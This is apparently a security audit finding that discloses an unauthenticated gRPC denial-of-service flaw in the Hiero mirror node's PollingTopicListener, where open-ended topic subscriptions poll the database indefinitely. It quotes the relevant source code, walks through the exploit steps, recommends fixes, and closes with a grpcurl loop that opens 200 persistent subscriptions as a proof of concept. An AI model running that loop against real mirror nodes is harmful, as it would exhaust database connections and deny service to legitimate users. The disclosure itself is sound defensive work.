### Title
Unbounded Indefinite DB Polling via Unauthenticated gRPC Subscription (PollingTopicListener DoS)

### Summary
`PollingTopicListener.listen()` constructs a Flux pipeline that repeats DB polls up to `Long.MAX_VALUE` times with no server-side timeout, idle-subscription limit, or max-subscriber enforcement. Because the gRPC `subscribeTopic` endpoint requires no authentication and the `endTime`/`limit` filter fields are entirely optional, an unprivileged attacker can open an arbitrary number of connections, each holding an open subscription to a valid but inactive topic, forcing the server to issue a DB query every 500 ms per subscription indefinitely until the database connection pool is exhausted.

### Finding Description

**Exact code path**

`PollingTopicListener.listen()` (lines 34–49):

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)   // ← effectively infinite
                .jitter(0.1)
                .withFixedDelay(interval)              // ← 500 ms default
                .withScheduler(scheduler))
        // no .timeout(), no .take(Duration), no idle-termination
        .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", ...));
``` [1](#0-0) 

Each repeat iteration calls `poll()`, which executes `topicMessageRepository.findByFilter(newFilter)` — a live DB query: [2](#0-1) 

**Root cause / failed assumption**

The pipeline assumes the subscriber will either (a) set an `endTime`/`limit` to self-terminate, or (b) disconnect (triggering the cancel handler). Neither is enforced server-side. When neither condition holds, the pipeline never completes.

`TopicMessageFilter.endTime` and `limit` are both optional with no server-enforced defaults: [3](#0-2) 

The protobuf spec explicitly documents this as intentional for legitimate clients ("If not set it will receive indefinitely"): [4](#0-3) 

`TopicMessageServiceImpl.subscribeTopic()` tracks subscriber count only as a Micrometer gauge — no enforcement of a maximum: [5](#0-4) 

When `endTime` is null, `pastEndTime()` returns `Flux.never()`, so the merge never terminates from the service layer either: [6](#0-5) 

**Exploit flow**

1. Attacker identifies any valid topic ID (publicly visible on-chain).
2. Attacker opens N gRPC TCP connections to port 5600 (no TLS required by default, no auth).
3. On each connection, attacker issues up to 5 `subscribeTopic` RPCs (the per-connection limit) with no `consensusEndTime` and `limit=0`.
4. Attacker holds all connections open without sending RST or cancelling.
5. Each subscription drives one `PollingTopicListener` pipeline polling the DB every 500 ms.
6. With N connections × 5 calls = 5N concurrent subscriptions → 5N DB queries per 500 ms.
7. DB connection pool (HikariCP) is exhausted; legitimate queries queue and time out.

**Why existing checks are insufficient**

| Check | Why it fails |
|---|---|
| `maxConcurrentCallsPerConnection = 5` | Limits calls *per TCP connection*; attacker opens more connections. No total-connection cap exists. [7](#0-6)  |
| `db.statementTimeout = 10000 ms` | Times out individual SQL statements; the polling *loop* itself is never cancelled. |
| `setOnCancelHandler(disposable::dispose)` | Only fires on client-initiated cancel/disconnect. A malicious client simply never cancels. [8](#0-7)  |
| `checkTopicExists = true` | Requires a valid topic, but any publicly known topic satisfies this. |

### Impact Explanation

When `hiero.mirror.grpc.listener.type=POLL` is configured, the DB connection pool is exhausted proportionally to the number of attacker-held subscriptions. Once exhausted, all gRPC subscribers (including legitimate ones) receive errors, and the mirror node's ability to serve HCS data is fully denied. Because the Hedera mirror node is the canonical public read path for HCS topic data relied upon by wallets, dApps, and exchanges, this constitutes a high-impact availability failure for the Hedera ecosystem.

### Likelihood Explanation

The attack requires zero privileges — only network access to port 5600 and knowledge of one valid topic ID (trivially obtained from public explorers). It is repeatable and persistent: the attacker need only keep TCP connections alive (standard keep-alive or a trivial script). The cost to the attacker is negligible (idle TCP connections); the cost to the server is a DB query every 500 ms per connection. A single attacker machine with modest resources can sustain thousands of connections.

### Recommendation

1. **Add a server-side subscription timeout**: Apply `.timeout(maxSubscriptionDuration)` in `listen()` or in `TopicMessageServiceImpl.subscribeTopic()` to forcibly terminate subscriptions that have been open longer than a configurable maximum (e.g., 1 hour).
2. **Enforce a maximum concurrent subscriber count**: Reject new subscriptions in `TopicMessageServiceImpl.subscribeTopic()` when `subscriberCount` exceeds a configurable threshold.
3. **Add per-IP or per-connection rate limiting**: Use a gRPC interceptor to limit the rate of new `subscribeTopic` calls per source IP.
4. **Enforce a minimum `endTime` or `limit`** for open-ended subscriptions, or require re-subscription after a maximum session duration.
5. **Add an idle-subscription timeout**: If no messages are emitted for a configurable idle period (e.g., 5 minutes), terminate the subscription with a retriable status code.

### Proof of Concept

```bash
# Requires grpcurl and a valid topic ID (e.g., 0.0.41110)
# Open 200 persistent subscriptions across 40 connections (5 per connection)
for i in $(seq 1 200); do
  grpcurl -plaintext \
    -d '{"topicID": {"topicNum": 41110}}' \
    -keepalive-time 3600 \
    localhost:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
done

# Each background process holds an open gRPC stream.
# After ~30 seconds, observe DB connection pool saturation via:
# curl -s http://localhost:8080/actuator/metrics/hikaricp.connections.active
# Legitimate subscribeTopic calls will begin timing out or returning UNAVAILABLE.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-48)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L23-41)
```java
    private Long endTime;

    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();

    @Builder.Default
    private String subscriberId = RandomStringUtils.random(8, 0, 0, true, true, null, RANDOM);

    @NotNull
    private EntityId topicId;

    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/consensus_service.proto (L20-25)
```text
    // Include messages which reached consensus before this time. If not set it will receive indefinitely.
    .proto.Timestamp consensusEndTime = 3;

    // The maximum number of messages to receive before stopping. If not set or set to zero it will return messages
    // indefinitely.
    uint64 limit = 4;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L50-53)
```java
        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```
